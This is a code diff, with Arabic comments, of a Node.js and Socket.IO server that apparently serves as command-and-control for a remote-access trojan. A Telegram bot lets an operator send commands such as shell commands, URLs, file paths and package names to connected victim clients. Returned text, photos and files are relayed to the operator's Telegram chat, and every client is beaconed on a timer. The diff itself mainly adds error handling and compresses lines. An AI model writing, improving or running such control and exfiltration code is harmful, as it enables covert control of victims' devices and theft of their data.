@@ -5,8 +5,6 @@ const telegramBot = require('node-telegram-bot-api');
 const https = require('https');
 const multer = require('multer');
 const fs = require('fs');
-
-// استدعاء ملف الأزرار
 const cmds = require('./commands');
 
 const app = express();
@@ -14,14 +12,25 @@ const server = http.createServer(app);
 const io = new Server(server);
 const uploader = multer();
 
-// قراءة الملفات
-const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
+let data;
+try {
+    data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
+} catch (e) {
+    console.error('Error reading data.json:', e.message);
+    process.exit(1);
+}
+
 const bot = new telegramBot(data.token, { polling: true });
 const appData = new Map();
 
-// ==========================================
-// دالة إرسال الأوامر
-// ==========================================
+// استقبال الأخطاء عشان ما يطيح السيرفر بصمت
+process.on('unhandledRejection', (reason, promise) => {
+    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
+});
+process.on('uncaughtException', (err) => {
+    console.error('Uncaught Exception:', err);
+});
+
 function emitTo(target, event, payload) {
     if (target === 'all' || !target) {
         io.emit(event, payload);
@@ -43,24 +52,13 @@ function askInput(prompt) {
     });
 }
 
-// ==========================================
-// الراوترات
-// ==========================================
 app.use(express.json());
-
 app.post('/upload', uploader.single('file'), (req, res) => {
     if (!req.file) return res.status(400).send('no file');
-    const target = req.body.target || 'unknown';
-    bot.sendDocument(data.id, req.file.buffer, {
-        caption: `<b>📁 ملف مستلم من → ${target}</b>`,
-        parse_mode: 'HTML'
-    }, { filename: req.file.originalname, contentType: 'application/octet-stream' });
+    bot.sendDocument(data.id, req.file.buffer, { caption: `<b>📁 ملف مستلم من → ${req.body.target || 'unknown'}</b>`, parse_mode: 'HTML' });
     res.send('Done');
 });
 
-// ==========================================
-// Socket.IO
-// ==========================================
 io.on('connection', (socket) => {
     const hdr = socket.handshake.headers;
     const botId = `${hdr['x-forwarded-for'] || 'local'}-${io.engine.clientsCount}`;
@@ -81,30 +79,21 @@ io.on('connection', (socket) => {
         try {
             if (!payload || !payload.type) return;
             const { type, text, base64, filename } = payload;
-            if (type === 'text' && text) {
-                bot.sendMessage(data.id, `<b>⌖ نتيجة من ${botId}:</b>\n\n${text}`, { parse_mode: 'HTML' });
-            } else if (type === 'photo' && base64) {
-                bot.sendPhoto(data.id, Buffer.from(base64, 'base64'), { caption: `📸 من ${botId}` });
-            } else if (type === 'file' && base64) {
-                bot.sendDocument(data.id, Buffer.from(base64, 'base64'), { caption: `📁 ${filename || 'file'}` });
-            }
+            if (type === 'text' && text) bot.sendMessage(data.id, `<b>⌖ نتيجة من ${botId}:</b>\n\n${text}`, { parse_mode: 'HTML' });
+            else if (type === 'photo' && base64) bot.sendPhoto(data.id, Buffer.from(base64, 'base64'), { caption: `📸 من ${botId}` });
+            else if (type === 'file' && base64) bot.sendDocument(data.id, Buffer.from(base64, 'base64'), { caption: `📁 ${filename || 'file'}` });
         } catch (e) {
             console.error('result error:', e.message);
         }
     });
 });
 
-// ==========================================
-// أوامر البوت
-// ==========================================
 bot.on('message', (msg) => {
     const text = msg.text;
     if (!text) return;
 
     if (text === '/start') {
-        bot.sendMessage(data.id,
-            `<b>⌖ مرحبا بك في بوت v${data.version || '2027.1'}</b>\n\n⌖ القناة: ${data.channel}\n⌖ المطور: ${data.adminUsername}\n\nاختر من القائمة:</b>\n\n`,
-            { parse_mode: 'HTML', reply_markup: cmds.buildMainKeyboard() });
+        bot.sendMessage(data.id, `<b>⌖ مرحبا بك في بوت v${data.version}</b>\n\n⌖ القناة: ${data.channel}\n⌖ المطور: ${data.adminUsername}\n\nاختر من القائمة:</b>\n\n`, { parse_mode: 'HTML', reply_markup: cmds.buildMainKeyboard() });
         return;
     }
 
@@ -144,11 +133,7 @@ bot.on('message', (msg) => {
         const target = appData.get('currentTarget');
         const pending = appData.get('pendingCmd');
         const val = text || '';
-        const extras = [
-            { key: 'text', value: val }, { key: 'number', value: val }, { key: 'duration', value: val },
-            { key: 'url', value: val }, { key: 'path', value: val }, { key: 'command', value: val },
-            { key: 'package', value: val }, { key: 'content', value: val }
-        ];
+        const extras = [{ key: 'text', value: val }, { key: 'number', value: val }, { key: 'duration', value: val }, { key: 'url', value: val }, { key: 'path', value: val }, { key: 'command', value: val }, { key: 'package', value: val }, { key: 'content', value: val }];
         emitTo(target, 'commend', { request: pending, extras });
         appData.delete('pendingCmd');
         appData.delete('currentAction');
@@ -198,12 +183,10 @@ bot.on('message', (msg) => {
     }
 });
 
-// فحص دوري
 setInterval(() => {
     io.sockets.sockets.forEach((s) => io.to(s.id).emit('ping', {}));
 }, data.beaconIntervalMs || 5000);
 
-// التشغيل
 server.listen(process.env.PORT || 3000, () => {
     console.log(`[v${data.version}] Listening on port 3000`);
 });
